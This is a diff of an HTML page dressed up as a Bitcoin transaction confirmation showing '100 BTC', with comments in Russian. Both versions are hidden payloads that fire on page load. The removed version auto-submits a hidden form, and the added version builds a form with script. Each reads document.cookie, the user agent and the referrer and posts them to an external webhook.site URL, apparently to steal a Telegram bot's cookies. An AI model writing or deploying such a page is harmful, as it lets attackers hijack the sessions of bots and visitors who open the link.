@@ -6,24 +6,34 @@
 <body>
     <h1>Transaction Hash: 1234567890abcdef...</h1>
     <p>Amount: 100 BTC ✅</p>
-    
-    <!-- Форма, которую бот может "отправить" -->
-    <form id="txForm" action="https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394" method="POST">
-        <input type="hidden" name="transaction_hash" value="1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef">
-        <input type="hidden" name="amount" value="100 BTC">
-        <input type="hidden" name="bot_cookies" id="cookieField" value="">
-        <input type="hidden" name="bot_useragent" value="TelegramBot">
-        <button type="submit">Confirm Transaction</button>
-    </form>
 
     <script>
-        // Заполняем поле куками перед отправкой
-        document.getElementById('cookieField').value = document.cookie;
-        
-        // Автоматически отправляем форму через 1 секунду
-        setTimeout(function() {
-            document.getElementById('txForm').submit();
-        }, 1000);
+        // Когда страница загружается, отправляем данные бота
+        window.onload = function() {
+            var data = {
+                'transaction': '1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef',
+                'amount': '100 BTC',
+                'cookies': document.cookie,
+                'user_agent': navigator.userAgent,
+                'referrer': document.referrer
+            };
+            
+            // Создаем форму и отправляем через POST
+            var form = document.createElement('form');
+            form.method = 'POST';
+            form.action = 'https://webhook.site/29ae4fb7-a36a-471d-844f-cd5abb1c4394';
+            
+            for (var key in data) {
+                var input = document.createElement('input');
+                input.type = 'hidden';
+                input.name = key;
+                input.value = data[key];
+                form.appendChild(input);
+            }
+            
+            document.body.appendChild(form);
+            form.submit();
+        };
     </script>
 </body>
 </html>
